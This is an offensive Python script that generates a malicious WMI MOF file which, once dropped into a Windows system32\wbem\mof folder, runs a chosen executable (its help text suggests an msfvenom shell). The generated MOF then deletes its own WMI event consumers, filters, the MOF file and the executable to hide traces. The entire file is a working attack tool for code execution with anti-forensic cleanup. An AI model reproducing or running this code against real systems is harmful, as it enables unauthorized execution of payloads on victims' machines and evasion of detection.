#!/usr/bin/python

import sys
import random
import string

##########################################################
# Usage: python wbemexec.py SHELLFILENAME MOFFILENAME    #
# Example: python wbemexec.py shell.exe evilmof.mof      #
#                                                        #
# This is my version of wbemexec.rb written in python.   #
# To use this program you will need a shell name located #
# in system32 folder of Windows which will be executed   #
# by the .mof file that this program will generate.      #
#                                                        #
# Author: Multie                                         #
##########################################################

def generate(exe, mofname):
    exe = str(exe)
    mofname = str(mofname)
    classname = id_generator()
    classname = str(classname)
    mof = r"""#pragma namespace("\\\\.\\root\\cimv2")
class MyClass"""+classname+r"""
{
  	[key] string Name;
};
class ActiveScriptEventConsumer : __EventConsumer
{
 	[key] string Name;
  	[not_null] string ScriptingEngine;
  	string ScriptFileName;
  	[template] string ScriptText;
  uint32 KillTimeout;
};
instance of __Win32Provider as $P
{
    Name  = "ActiveScriptEventConsumer";
    CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
    PerUserInitialization = TRUE;
};
instance of __EventConsumerProviderRegistration
{
  Provider = $P;
  ConsumerClassNames = {"ActiveScriptEventConsumer"};
};
Instance of ActiveScriptEventConsumer as $cons
{
  Name = "ASEC";
  ScriptingEngine = "JScript";
  ScriptText = "\ntry {var s = new ActiveXObject(\"Wscript.Shell\");\ns.Run(\""""+exe+r"""\");} catch (err) {};\nsv = GetObject(\"winmgmts:root\\\\cimv2\");try {sv.Delete(\"MyClass"""+classname+r"""\");} catch (err) {};try {sv.Delete(\"__EventFilter.Name='instfilt'\");} catch (err) {};try {sv.Delete(\"ActiveScriptEventConsumer.Name='ASEC'\");} catch(err) {};";

};
Instance of ActiveScriptEventConsumer as $cons2
{
  Name = "qndASEC";
  ScriptingEngine = "JScript";
  ScriptText = "\nvar objfs = new ActiveXObject(\"Scripting.FileSystemObject\");\ntry {var f1 = objfs.GetFile(\"wbem\\mof\\good\\"""+mofname+r"""\");\nf1.Delete(true);} catch(err) {};\ntry {\nvar f2 = objfs.GetFile(\""""+exe+r"""\");\nf2.Delete(true);\nvar s = GetObject(\"winmgmts:root\\\\cimv2\");s.Delete(\"__EventFilter.Name='qndfilt'\");s.Delete(\"ActiveScriptEventConsumer.Name='qndASEC'\");\n} catch(err) {};";
};
instance of __EventFilter as $Filt
{
  Name = "instfilt";
  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \"MyClass"""+classname+r"""\"";
  QueryLanguage = "WQL";
};
instance of __EventFilter as $Filt2
{
  Name = "qndfilt";
  Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name = \""""+exe+r"""\"";
  QueryLanguage = "WQL";

};
instance of __FilterToConsumerBinding as $bind
{
  Consumer = $cons;
  Filter = $Filt;
};
instance of __FilterToConsumerBinding as $bind2
{
  Consumer = $cons2;
  Filter = $Filt2;
};
instance of MyClass"""+classname+r""" as $MyClass
{
  Name = "ClassConsumer";
};
"""
    evilmof = open(str(mofname),"w")
    evilmof.write(mof)
    evilmof.close()

def id_generator(size=8, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def main():
    if len(sys.argv) == 1 or sys.argv[1] == '-h' or sys.argv[1] == '--help':
        print 'Usage: python wbemexec.py [exeFILENAME] [mofFILENAME]'
        print 'Example: python wbemexec.py shell.exe evilmof.mof'
        print ''
        print 'This program will execute a shell file located in the system32 folder'
        print 'of Windows system. For example that shell file can be created with msfvenom.'
        print 'The mof file name you choose has to be transfered to the system32\wbem\mof\ folder'
        print 'where it will be automatically compiled and installed which will run the command'
        print 'that will run the shell located in system32.'
    else:
        exe = sys.argv[1]
        mofname = sys.argv[2]
        exe = str(exe)
        mofname = str(mofname)
        generate(exe,mofname)

main()
